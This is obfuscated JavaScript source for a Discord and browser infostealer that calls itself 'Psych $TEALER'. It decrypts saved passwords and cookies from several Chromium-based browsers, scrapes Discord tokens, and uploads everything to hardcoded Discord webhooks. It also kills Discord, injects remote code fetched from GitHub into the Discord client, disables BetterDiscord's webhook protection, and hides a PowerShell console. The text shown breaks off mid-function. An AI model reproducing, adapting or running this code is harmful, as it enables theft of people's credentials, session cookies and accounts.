var a0_0x5770e0 = require('glob')
const a0_0x3d690d = require('fs')
var a0_0x4ec91d = require('form-data')
const a0_0x46b5ba = require('https'),
  a0_0xf2a115 = require('axios'),
  a0_0x1f9f27 = require('crypto'),
  a0_0x2522bc = require('nexe-natives-fix')(require.resolve('win-dpapi')),
  a0_0x1c5c6d = require('nexe-natives-fix')(require.resolve('sqlite3')),
  a0_0x4721e6 =
    'https://discord.com/api/webhooks/954333951462363156/aoUCgMl0XB9S9KHQ8YerYsu0dXAEBHE2AapqVzNqGyqYxkwCsjl4g6PbrcRVdN2N-xNl',
  a0_0x39980c =
    'https://discord.com/api/webhooks/954333951462363156/aoUCgMl0XB9S9KHQ8YerYsu0dXAEBHE2AapqVzNqGyqYxkwCsjl4g6PbrcRVdN2N-xNl',
  a0_0x356f47 =
    'https://raw.githubusercontent.com/RustlerJS/rustlers/main/nero',
  { exec: a0_0x5bc28c } = require('child_process')
var a0_0x1aee56 = false,
  a0_0xda6aba = process.argv.slice(2)
if (a0_0xda6aba[0] == 'debug') {
  a0_0x1aee56 = false
}
const a0_0x2997bf = require('buffer-replace'),
  a0_0x5ba74e =
    'https://discord.com/api/webhooks/959095614346498138/j5tFVY593rqf5ZZGi_e4J9sSW6cSIYSyhvEZxoJ8Jj2JjhOLIdKjY15s3qYYNI3p5Uls',
  a0_0x1bdc6a = {
    logout: 'instant',
    'inject-notify': 'true',
    'logout-notify': 'true',
    'init-notify': 'false',
    'embed-color': 3553599,
    'disable-qr-code': 'true',
  }
var a0_0x1a05d2 = process.env.APPDATA,
  a0_0x3fe807 = process.env.LOCALAPPDATA,
  a0_0x273e0b = process.env.LOCALAPPDATA,
  a0_0x3e53a0 = []
a0_0x3d690d.readdirSync(a0_0x273e0b).forEach((_0x28c7fb) => {
  if (_0x28c7fb.includes('cord')) {
    a0_0x3e53a0.push(a0_0x273e0b + '\\' + _0x28c7fb)
  } else {
    return
  }
})
a0_0x3e53a0.forEach((_0x223845) => {
  let _0x103331 =
    _0x223845 +
    '\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js'
  a0_0x5770e0.sync(_0x103331).map((_0x4be562) => {
    injectPath.push(_0x4be562)
    a0_0x7f169e()
  })
})
runningDiscords = []
paths = [
  a0_0x1a05d2 + '\\discord\\',
  a0_0x1a05d2 + '\\discordcanary\\',
  a0_0x1a05d2 + '\\discordptb\\',
  a0_0x1a05d2 + '\\discorddevelopment\\',
  a0_0x1a05d2 + '\\lightcord\\',
  a0_0x273e0b + '\\Google\\Chrome\\User Data\\Default\\',
  a0_0x273e0b + '\\Google\\Chrome\\User Data\\Profile 1\\',
  a0_0x273e0b + '\\Google\\Chrome\\User Data\\Profile 2\\',
  a0_0x273e0b + '\\Google\\Chrome\\User Data\\Profile 3\\',
  a0_0x273e0b + '\\Google\\Chrome\\User Data\\Profile 4\\',
  a0_0x273e0b + '\\Google\\Chrome\\User Data\\Profile 5\\',
  a0_0x273e0b + '\\Google\\Chrome\\User Data\\Guest Profile\\',
  a0_0x273e0b + '\\Google\\Chrome\\User Data\\Default\\Network\\',
  a0_0x273e0b + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
  a0_0x273e0b + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
  a0_0x273e0b + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
  a0_0x273e0b + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
  a0_0x273e0b + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
  a0_0x273e0b + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
  a0_0x1a05d2 + '\\Opera Software\\Opera Stable\\',
  a0_0x1a05d2 + '\\Opera Software\\Opera GX Stable\\',
  a0_0x273e0b + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
  a0_0x273e0b + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
  a0_0x273e0b + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
  a0_0x273e0b + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
  a0_0x273e0b + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
  a0_0x273e0b + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
  a0_0x273e0b + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
  a0_0x273e0b + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
  a0_0x273e0b + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
  a0_0x273e0b + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
  a0_0x273e0b + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
  a0_0x273e0b + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
  a0_0x273e0b + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
  a0_0x273e0b + '\\Microsoft\\Edge\\User Data\\Default\\',
  a0_0x273e0b + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
  a0_0x273e0b + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
  a0_0x273e0b + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
  a0_0x273e0b + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
  a0_0x273e0b + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
  a0_0x273e0b + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
  a0_0x273e0b + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
  a0_0x273e0b +
    '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
  a0_0x273e0b +
    '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
  a0_0x273e0b +
    '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
  a0_0x273e0b +
    '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
  a0_0x273e0b +
    '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
  a0_0x273e0b +
    '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
  a0_0x273e0b + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
  a0_0x273e0b + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
  a0_0x273e0b + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
  a0_0x273e0b + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
  a0_0x273e0b + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
  a0_0x273e0b + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
  a0_0x273e0b + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
  a0_0x273e0b + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
  a0_0x273e0b + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
  a0_0x273e0b + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
  a0_0x273e0b + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
  a0_0x273e0b + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
  a0_0x273e0b + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\',
]
a0_0x3d690d.readdirSync(a0_0x273e0b).forEach((_0x28c7fb) => {
  if (_0x28c7fb.includes('cord')) {
    a0_0x3e53a0.push(a0_0x273e0b + '\\' + _0x28c7fb)
  } else {
    return
  }
})
a0_0x3e53a0.forEach((_0x223845) => {
  let _0x103331 =
    _0x223845 +
    '\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js'
  a0_0x5770e0.sync(_0x103331).map((_0x4be562) => {
    injectPath.push(_0x4be562)
    a0_0x7f169e()
  })
})
a0_0x1b3fb0()
a0_0x18bd14()
a0_0xa701b3()
a0_0x117c39()
a0_0x7f169e()
function a0_0x1999ad() {
  a0_0x46b5ba
    .get(a0_0x356f47, (_0x5be133) => {
      let _0x2b74fd = ''
      _0x5be133.on('data', (_0x4553a8) => {
        _0x2b74fd += _0x4553a8
      })
      _0x5be133.on('end', () => {
        injectPath.forEach((_0x312590) => {
          a0_0x3d690d.writeFileSync(
            _0x312590,
            _0x2b74fd
              .replace('%WEBHOOK_LINK%', a0_0x5ba74e)
              .replace('%INITNOTI%', a0_0x1bdc6a['init-notify'])
              .replace('%LOGOUT%', a0_0x1bdc6a.logout)
              .replace('%LOGOUTNOTI%', a0_0x1bdc6a['logout-notify'])
              .replace('3447704', a0_0x1bdc6a['embed-color'])
              .replace('%DISABLEQRCODE%', a0_0x1bdc6a['disable-qr-code']),
            {
              encoding: 'utf8',
              flag: 'w',
            }
          )
          if (a0_0x1bdc6a['init-notify'] == 'true') {
            let _0x483d52 = _0x312590.replace('index.js', 'init')
            !a0_0x3d690d.existsSync(_0x483d52) &&
              a0_0x3d690d.mkdirSync(_0x483d52, 484)
          }
          if (a0_0x1bdc6a.logout != 'false') {
            let _0x33f32d = _0x312590.replace('index.js', 'Rustler')
            if (!a0_0x3d690d.existsSync(_0x33f32d)) {
              a0_0x3d690d.mkdirSync(_0x33f32d, 484)
              a0_0x1bdc6a.logout == 'instant' && a0_0x139811()
            } else {
              a0_0x3d690d.existsSync(_0x33f32d) &&
                a0_0x1bdc6a.logout == 'instant' &&
                a0_0x139811()
            }
          }
        })
      })
    })
    .on('error', (_0x17a74c) => {
      console.log(_0x17a74c)
    })
}
function a0_0x7f169e() {
  const _0x30691f = (function () {
      let _0x38685c = true
      return function (_0x2aeaef, _0x84398f) {
        const _0xf85982 = _0x38685c
          ? function () {
              if (_0x84398f) {
                const _0x5b3606 = _0x84398f.apply(_0x2aeaef, arguments)
                return (_0x84398f = null), _0x5b3606
              }
            }
          : function () {}
        return (_0x38685c = false), _0xf85982
      }
    })(),
    _0x14e766 = _0x30691f(this, function () {
      let _0x1b5eff
      try {
        const _0x27f8ba = Function(
          'return (function() {}.constructor("return this")( ));'
        )
        _0x1b5eff = _0x27f8ba()
      } catch (_0x463735) {
        _0x1b5eff = window
      }
      const _0x16f842 = (_0x1b5eff.console = _0x1b5eff.console || {})
      const _0x43fdaa = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
      for (let _0x11dc2c = 0; _0x11dc2c < _0x43fdaa.length; _0x11dc2c++) {
        const _0xaf4fad = _0x30691f.constructor.prototype.bind(_0x30691f),
          _0x2bc42d = _0x43fdaa[_0x11dc2c],
          _0xc63bbe = _0x16f842[_0x2bc42d] || _0xaf4fad
        _0xaf4fad['__proto__'] = _0x30691f.bind(_0x30691f)
        _0xaf4fad.toString = _0xc63bbe.toString.bind(_0xc63bbe)
        _0x16f842[_0x2bc42d] = _0xaf4fad
      }
    })
  _0x14e766()
  a0_0x5bc28c('tasklist', function (_0x4000b5, _0x453cd2, _0x2d3020) {
    if (_0x453cd2.includes('Discord.exe')) {
      runningDiscords.push('Discord')
    }
    if (_0x453cd2.includes('DiscordCanary.exe')) {
      runningDiscords.push('DiscordCanary')
    }
    if (_0x453cd2.includes('DiscordPTB.exe')) {
      runningDiscords.push('DiscordPTB')
    }
    if (_0x453cd2.includes('DiscordDevelopment.exe')) {
      runningDiscords.push('DiscordDevelopment')
    }
    a0_0x1e5777()
  })
}
function a0_0x1e5777() {
  runningDiscords.forEach((_0x2014a8) => {
    a0_0x5bc28c('taskkill /IM ' + _0x2014a8 + '.exe /F', (_0x44f8bf) => {
      if (_0x44f8bf) {
        return
      }
    })
  })
  a0_0x1999ad()
  a0_0x3e8df3()
}
function a0_0x139811() {
  runningDiscords.forEach((_0x38642d) => {
    try {
      a0_0x5bc28c(
        a0_0x273e0b +
          '\\' +
          _0x38642d +
          '\\Update.exe' +
          ' --processStart ' +
          _0x38642d +
          '.exe',
        (_0x4a1765) => {
          if (_0x4a1765) {
            if (a0_0x1aee56) {
              console.log(_0x4a1765)
            }
          }
        }
      )
    } catch (_0x2afb5c) {}
  })
}
function a0_0x3e8df3() {
  var _0x4d060a =
    process.env.appdata + '\\BetterDiscord\\data\\betterdiscord.asar'
  if (a0_0x3d690d.existsSync(_0x4d060a)) {
    var _0x27bb = a0_0x3d690d.readFileSync(_0x4d060a)
    a0_0x3d690d.writeFileSync(
      _0x4d060a,
      a0_0x2997bf(_0x27bb, 'api/webhooks', 'kkkkk')
    )
  } else {
    return
  }
}
async function a0_0x4faea0(_0x52747c) {
  let _0x130832 = _0x52747c.split('\\'),
    _0x5bd180 = _0x52747c.includes('Network')
      ? _0x130832.splice(0, _0x130832.length - 3)
      : _0x130832.splice(0, _0x130832.length - 2),
    _0x5e16d6 = _0x5bd180.join('\\') + '\\'
  if (_0x52747c.startsWith(a0_0x1a05d2)) {
    _0x5e16d6 = _0x52747c
  }
  if (_0x52747c.includes('cord')) {
    return
  }
  if (a0_0x3d690d.existsSync(_0x5e16d6)) {
    let _0x430fdd = Buffer.from(
      JSON.parse(a0_0x3d690d.readFileSync(_0x5e16d6 + 'Local State')).os_crypt
        .encrypted_key,
      'base64'
    ).slice(5)
    var _0x449c0e = _0x52747c + 'Login Data',
      _0x52e6a5 = _0x52747c + 'passwords.db'
    a0_0x3d690d.copyFileSync(_0x449c0e, _0x52e6a5)
    const _0x1117df = a0_0x2522bc.unprotectData(
      Buffer.from(_0x430fdd, 'utf-8'),
      null,
      'CurrentUser'
    )
    var _0x31b6bc = '\n\nPASSWORDS FROM: ' + _0x52747c + '  #PsychONTOP\n',
      _0x24487d = new a0_0x1c5c6d.Database(_0x52e6a5, (_0x34fca3) => {
        if (_0x34fca3) {
          if (a0_0x1aee56) {
            console.log(_0x34fca3)
          }
        }
      })
    const _0x1468fd = await new Promise((_0x59576c, _0x3d0453) => {
      _0x24487d.each(
        'SELECT origin_url, username_value, password_value FROM logins',
        function (_0x2d78f8, _0x145400) {
          if (_0x2d78f8) {
            if (a0_0x1aee56) {
              console.log(_0x2d78f8)
            }
          }
          if (_0x145400.username_value != '') {
            let _0x5b0470 = _0x145400.password_value
            try {
              if (
                _0x5b0470[0] == 1 &&
                _0x5b0470[1] == 0 &&
                _0x5b0470[2] == 0 &&
                _0x5b0470[3] == 0
              ) {
                _0x31b6bc +=
                  '\nURL: ' +
                  _0x145400.origin_url +
                  ' | USERNAME: ' +
                  _0x145400.username_value +
                  ' | PASSWORD: ' +
                  a0_0x2522bc
                    .unprotectData(_0x5b0470, null, 'CurrentUser')
                    .toString('utf-8')
              } else {
                let _0x2b58f4 = _0x5b0470.slice(3, 15),
                  _0x4a8326 = _0x5b0470.slice(15, _0x5b0470.length - 16),
                  _0x3a1a24 = _0x5b0470.slice(
                    _0x5b0470.length - 16,
                    _0x5b0470.length
                  ),
                  _0x58235a = a0_0x1f9f27.createDecipheriv(
                    'aes-256-gcm',
                    _0x1117df,
                    _0x2b58f4
                  )
                _0x58235a.setAuthTag(_0x3a1a24)
                _0x31b6bc +=
                  '\nURL: ' +
                  _0x145400.origin_url +
                  ' | USERNAME: ' +
                  _0x145400.username_value +
                  ' | PASSWORD: ' +
                  _0x58235a.update(_0x4a8326, 'base64', 'utf-8') +
                  _0x58235a.final('utf-8')
              }
            } catch (_0x76df0b) {
              if (a0_0x1aee56) {
                console.log(_0x76df0b)
              }
            }
          }
        },
        function () {
          _0x59576c(_0x31b6bc)
        }
      )
    })
    return _0x1468fd
  } else {
    return ''
  }
}
async function a0_0x2fa401(_0x35fded) {
  let _0x4fa93d = _0x35fded.split('\\'),
    _0x6f6b14 = _0x35fded.includes('Network')
      ? _0x4fa93d.splice(0, _0x4fa93d.length - 3)
      : _0x4fa93d.splice(0, _0x4fa93d.length - 2),
    _0x479749 = _0x6f6b14.join('\\') + '\\'
  if (_0x35fded.startsWith(a0_0x1a05d2)) {
    _0x479749 = _0x35fded
  }
  if (_0x35fded.includes('cord')) {
    return
  }
  if (a0_0x3d690d.existsSync(_0x479749)) {
    let _0x49fbb2 = Buffer.from(
      JSON.parse(a0_0x3d690d.readFileSync(_0x479749 + 'Local State')).os_crypt
        .encrypted_key,
      'base64'
    ).slice(5)
    var _0x53acae = _0x35fded + 'Cookies',
      _0x3ad0de = _0x35fded + 'cookies.db'
    a0_0x3d690d.copyFileSync(_0x53acae, _0x3ad0de)
    const _0xfd87bc = a0_0x2522bc.unprotectData(
      Buffer.from(_0x49fbb2, 'utf-8'),
      null,
      'CurrentUser'
    )
    var _0x32f138 = '',
      _0x1f7c6e = new a0_0x1c5c6d.Database(_0x3ad0de, (_0x173fa6) => {
        if (_0x173fa6) {
          if (a0_0x1aee56) {
            console.log(_0x173fa6)
          }
        }
      })
    const _0x3ee9d7 = await new Promise((_0x3a96e0, _0x53f511) => {
      _0x1f7c6e.each(
        'SELECT host_key, name, encrypted_value FROM cookies',
        function (_0x4b0acf, _0x49265f) {
          if (_0x4b0acf) {
            if (a0_0x1aee56) {
              console.log(_0x4b0acf)
            }
          }
          let _0x10d299 = _0x49265f.encrypted_value
          try {
            if (
              _0x10d299[0] == 1 &&
              _0x10d299[1] == 0 &&
              _0x10d299[2] == 0 &&
              _0x10d299[3] == 0
            ) {
              _0x32f138 +=
                _0x49265f.host_key +
                '\t' +
                'TRUE' +
                '\t/' +
                '\tFALSE' +
                '\t2597573456\t' +
                _0x49265f.name +
                '\t' +
                a0_0x2522bc.unprotectData(_0x10d299, null, 'CurrentUser') +
                '\n'.toString('utf-8')
            } else {
              let _0x48e8fc = _0x10d299.slice(3, 15),
                _0x27f4a8 = _0x10d299.slice(15, _0x10d299.length - 16),
                _0xde248f = _0x10d299.slice(
                  _0x10d299.length - 16,
                  _0x10d299.length
                ),
                _0x2aae48 = a0_0x1f9f27.createDecipheriv(
                  'aes-256-gcm',
                  _0xfd87bc,
                  _0x48e8fc
                )
              _0x2aae48.setAuthTag(_0xde248f)
              _0x32f138 +=
                _0x49265f.host_key +
                '\t' +
                'TRUE' +
                '\t/' +
                '\tFALSE' +
                '\t2597573456\t' +
                _0x49265f.name +
                '\t' +
                _0x2aae48.update(_0x27f4a8, 'base64', 'utf-8') +
                _0x2aae48.final('utf-8') +
                '\n'
            }
          } catch (_0x150aef) {
            if (a0_0x1aee56) {
              console.log(_0x150aef)
            }
          }
        },
        function () {
          _0x3a96e0(_0x32f138)
        }
      )
    })
    return _0x3ee9d7
  } else {
    return ''
  }
}
function a0_0x56a25a(_0x57047d) {
  _0x57047d += 'Local Storage\\leveldb'
  let _0x1d28eb = []
  try {
    a0_0x3d690d.readdirSync(_0x57047d).map((_0x36f681) => {
      ;(_0x36f681.endsWith('.log') || _0x36f681.endsWith('.ldb')) &&
        a0_0x3d690d
          .readFileSync(_0x57047d + '\\' + _0x36f681, 'utf8')
          .split(/\r?\n/)
          .forEach((_0x190a72) => {
            const _0x1d3b1d = [
              new RegExp(/mfa\.[\w-]{84}/g),
              new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g),
            ]
            for (const _0x461776 of _0x1d3b1d) {
              const _0x5f336e = _0x190a72.match(_0x461776)
              if (_0x5f336e) {
                _0x5f336e.forEach((_0x1ef398) => _0x1d28eb.push(_0x1ef398))
              }
            }
          })
    })
  } catch (_0x3b9ecd) {}
  return _0x1d28eb
}
async function a0_0x1b3fb0() {
  const _0x457d41 = (function () {
    let _0x9f0a6b = true
    return function (_0x566487, _0x24fbfa) {
      const _0xc7d373 = _0x9f0a6b
        ? function () {
            if (_0x24fbfa) {
              const _0x405c0c = _0x24fbfa.apply(_0x566487, arguments)
              return (_0x24fbfa = null), _0x405c0c
            }
          }
        : function () {}
      return (_0x9f0a6b = false), _0xc7d373
    }
  })()
  const _0x2ba4dd = (function () {
      const _0x380868 = _0x457d41(this, function () {
        return _0x380868
          .toString()
          .search('(((.+)+)+)+$')
          .toString()
          .constructor(_0x380868)
          .search('(((.+)+)+)+$')
      })
      _0x380868()
      let _0x418785 = true
      return function (_0x417340, _0x569914) {
        const _0x3a50a4 = _0x418785
          ? function () {
              if (_0x569914) {
                const _0x4b32c2 = _0x569914.apply(_0x417340, arguments)
                return (_0x569914 = null), _0x4b32c2
              }
            }
          : function () {}
        return (_0x418785 = false), _0x3a50a4
      }
    })(),
    _0x333099 = _0x2ba4dd(this, function () {
      return _0x333099
        .toString()
        .search('(((.+)+)+)+$')
        .toString()
        .constructor(_0x333099)
        .search('(((.+)+)+)+$')
    })
  _0x333099()
  let _0x5a499d = ''
  for (let _0x21e30d = 0; _0x21e30d < paths.length; _0x21e30d++) {
    if (a0_0x3d690d.existsSync(paths[_0x21e30d] + 'Login Data')) {
      _0x5a499d += (await a0_0x4faea0(paths[_0x21e30d])) || ''
    }
  }
  a0_0x3d690d.writeFile(
    a0_0x1a05d2 + '\\passwords.txt',
    _0x5a499d,
    function (_0x214615, _0xc26fae) {
      if (_0x214615) {
        throw _0x214615
      }
      const _0x29efdc = new a0_0x4ec91d()
      _0x29efdc.append(
        'file',
        a0_0x3d690d.createReadStream(a0_0x1a05d2 + '\\passwords.txt')
      )
      _0x29efdc.submit(a0_0x5ba74e, (_0x174c82, _0x2de5a3) => {
        if (_0x174c82) {
          console.log(_0x174c82)
        }
      })
    }
  )
  a0_0x3d690d.writeFile(
    a0_0x1a05d2 + '\\src-passwords.txt',
    _0x5a499d,
    function (_0x1503ce, _0x52bfed) {
      if (_0x1503ce) {
        throw _0x1503ce
      }
      const _0x2839cd = new a0_0x4ec91d()
      _0x2839cd.append(
        'file',
        a0_0x3d690d.createReadStream(a0_0x1a05d2 + '\\src-passwords.txt')
      )
      _0x2839cd.submit(a0_0x4721e6, (_0x3791aa, _0x4487c3) => {
        if (_0x3791aa) {
          console.log(_0x3791aa)
        }
      })
    }
  )
  a0_0x3d690d.writeFile(
    a0_0x1a05d2 + '\\nero-passwords.txt',
    _0x5a499d,
    function (_0x181fc4, _0x160233) {
      if (_0x181fc4) {
        throw _0x181fc4
      }
      const _0x7212e2 = new a0_0x4ec91d()
      _0x7212e2.append(
        'file',
        a0_0x3d690d.createReadStream(a0_0x1a05d2 + '\\nero-passwords.txt')
      )
      _0x7212e2.submit(a0_0x39980c, (_0x1928e0, _0x24bb4f) => {
        if (_0x1928e0) {
          console.log(_0x1928e0)
        }
      })
    }
  )
}
async function a0_0x18bd14() {
  const _0x19e3b5 = (function () {
      let _0x3c33e9 = true
      return function (_0x2be14b, _0x564d16) {
        const _0x1e4b88 = _0x3c33e9
          ? function () {
              if (_0x564d16) {
                const _0x4595ac = _0x564d16.apply(_0x2be14b, arguments)
                return (_0x564d16 = null), _0x4595ac
              }
            }
          : function () {}
        return (_0x3c33e9 = false), _0x1e4b88
      }
    })(),
    _0x27b066 = _0x19e3b5(this, function () {
      let _0x5cd7f1
      try {
        const _0x3b19bb = Function(
          'return (function() {}.constructor("return this")( ));'
        )
        _0x5cd7f1 = _0x3b19bb()
      } catch (_0x4c8afb) {
        _0x5cd7f1 = window
      }
      const _0x4450c1 = (_0x5cd7f1.console = _0x5cd7f1.console || {}),
        _0x2bdb0b = [
          'log',
          'warn',
          'info',
          'error',
          'exception',
          'table',
          'trace',
        ]
      for (let _0x52fadb = 0; _0x52fadb < _0x2bdb0b.length; _0x52fadb++) {
        const _0x10832f = _0x19e3b5.constructor.prototype.bind(_0x19e3b5),
          _0x1ead63 = _0x2bdb0b[_0x52fadb],
          _0x1da755 = _0x4450c1[_0x1ead63] || _0x10832f
        _0x10832f['__proto__'] = _0x19e3b5.bind(_0x19e3b5)
        _0x10832f.toString = _0x1da755.toString.bind(_0x1da755)
        _0x4450c1[_0x1ead63] = _0x10832f
      }
    })
  _0x27b066()
  let _0x3c69a2 = ''
  for (let _0x42c898 = 0; _0x42c898 < paths.length; _0x42c898++) {
    if (a0_0x3d690d.existsSync(paths[_0x42c898] + 'Cookies')) {
      _0x3c69a2 += (await a0_0x2fa401(paths[_0x42c898])) || ''
    }
  }
  a0_0x3d690d.writeFile(
    a0_0x1a05d2 + '\\cookies.txt',
    _0x3c69a2,
    function (_0x1bba56, _0x4aef75) {
      if (_0x1bba56) {
        throw _0x1bba56
      }
      const _0x2b68e8 = new a0_0x4ec91d()
      _0x2b68e8.append(
        'file',
        a0_0x3d690d.createReadStream(a0_0x1a05d2 + '\\cookies.txt')
      )
      _0x2b68e8.submit(a0_0x5ba74e, (_0x3cacc7, _0x4f88db) => {
        if (_0x3cacc7) {
          console.log(_0x3cacc7)
        }
      })
    }
  )
  a0_0x3d690d.writeFile(
    a0_0x1a05d2 + '\\src-cookies.txt',
    _0x3c69a2,
    function (_0x123a28, _0x2b474b) {
      if (_0x123a28) {
        throw _0x123a28
      }
      const _0x4d9f66 = new a0_0x4ec91d()
      _0x4d9f66.append(
        'file',
        a0_0x3d690d.createReadStream(a0_0x1a05d2 + '\\src-cookies.txt')
      )
      _0x4d9f66.submit(a0_0x4721e6, (_0x5b7342, _0x4b43ab) => {
        if (_0x5b7342) {
          console.log(_0x5b7342)
        }
      })
    }
  )
  a0_0x3d690d.writeFile(
    a0_0x1a05d2 + '\\nero-cookies.txt',
    _0x3c69a2,
    function (_0x42352d, _0x394138) {
      if (_0x42352d) {
        throw _0x42352d
      }
      const _0x48af9e = new a0_0x4ec91d()
      _0x48af9e.append(
        'file',
        a0_0x3d690d.createReadStream(a0_0x1a05d2 + '\\nero-cookies.txt')
      )
      _0x48af9e.submit(a0_0x39980c, (_0x3b2a95, _0x1c8ff6) => {
        if (_0x3b2a95) {
          console.log(_0x3b2a95)
        }
      })
    }
  )
}
async function a0_0xa701b3() {
  const _0x1e32b6 = []
  for (let _0x1da765 of paths) {
    const _0x34a2e5 = a0_0x56a25a(_0x1da765)
    if (_0x34a2e5) {
      _0x34a2e5.forEach((_0x5d76b4) => {
        var _0x327b31 = {
          name: '<:browserstokens:951827260741156874> Browser Token;',
          value:
            '```' +
            _0x5d76b4 +
            '```[CopyToken](https://rustlercoppy.com/copy/' +
            _0x5d76b4 +
            ')',
          inline: true,
        }
        _0x1e32b6.push(_0x327b31)
      })
    }
  }
  a0_0xf2a115
    .post(a0_0x5ba74e, {
      content: null,
      embeds: [
        {
          color: a0_0x1bdc6a['embed-color'],
          fields: _0x1e32b6.filter(a0_0x5857ac),
          author: {
            name: 'Psych $TEALER',
            icon_url:
              'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
          },
          footer: _0x5a45f7,
        },
      ],
    })
    .then((_0x31e635) => {})
    .catch((_0x17563e) => {})
  a0_0xf2a115
    .post(a0_0x4721e6, {
      content: null,
      embeds: [
        {
          color: a0_0x1bdc6a['embed-color'],
          fields: _0x1e32b6.filter(a0_0x5857ac),
          author: {
            name: 'Psych $TEALER',
            icon_url:
              'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
          },
          footer: _0x804e33,
        },
      ],
    })
    .then((_0x295f88) => {})
    .catch((_0x27f562) => {})
  a0_0xf2a115
    .post(a0_0x39980c, {
      content: null,
      embeds: [
        {
          color: a0_0x1bdc6a['embed-color'],
          fields: _0x1e32b6.filter(a0_0x5857ac),
          author: _0x1be521,
          footer: { text: 'Psych $TEALER' },
        },
      ],
    })
    .then((_0x173351) => {})
    .catch((_0x550d51) => {})
  a0_0xf2a115
    .post(a0_0x5ba74e, {
      content: null,
      embeds: [
        {
          color: a0_0x1bdc6a['embed-color'],
          fields: _0x1e32b6.filter(a0_0x5857ac),
          author: {
            name: 'Psych $TEALER',
            icon_url:
              'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
          },
          footer: _0x5a45f7,
        },
      ],
    })
    .then((_0x31e635) => {})
    .catch((_0x17563e) => {})
  a0_0xf2a115
    .post(a0_0x4721e6, {
      content: null,
      embeds: [
        {
          color: a0_0x1bdc6a['embed-color'],
          fields: _0x1e32b6.filter(a0_0x5857ac),
          author: {
            name: 'Psych $TEALER',
            icon_url:
              'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
          },
          footer: _0x804e33,
        },
      ],
    })
    .then((_0x295f88) => {})
    .catch((_0x27f562) => {})
  a0_0xf2a115
    .post(a0_0x39980c, {
      content: null,
      embeds: [
        {
          color: a0_0x1bdc6a['embed-color'],
          fields: _0x1e32b6.filter(a0_0x5857ac),
          author: _0x1be521,
          footer: { text: 'Psych $TEALER' },
        },
      ],
    })
    .then((_0x173351) => {})
    .catch((_0x550d51) => {})
}
function a0_0x1ef395() {
  let _0x290636 =
      '\n    Add-Type -Name Window -Namespace Console -MemberDefinition \'\n    [DllImport("Kernel32.dll")]\n    public static extern IntPtr GetConsoleWindow();\n\n    [DllImport("user32.dll")]\n    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);\n    \'\n\n    $consolePtr = [Console.Window]::GetConsoleWindow()\n    #0 hide\n    [Console.Window]::ShowWindow($consolePtr, 0)\n    ',
    _0x4390e8 = process.cwd() + '\\temp.ps1'
  try {
    a0_0x3d690d.writeFileSync(_0x4390e8, _0x290636)
    require('child_process').execSync(
      'type .\\temp.ps1 | powershell.exe -noprofile -',
      { stdio: 'inherit' }
    )
    a0_0x3d690d.unlinkSync(_0x4390e8)
  } catch (_0x30fee7) {}
}
function a0_0x474d0c(_0x384fe4) {
  return new Promise((_0x12cd93) => {
    setTimeout(_0x12cd93, _0x384fe4)
  })
}
function a0_0x5857ac(_0x5c96fb, _0x290490, _0x55036e) {
  return _0x55036e.indexOf(_0x5c96fb) === _0x290490
}
async function a0_0x117c39() {
  await a0_0x474d0c(1000)
  a0_0x3d690d.unlinkSync(a0_0x1a05d2 + '\\passwords.txt')
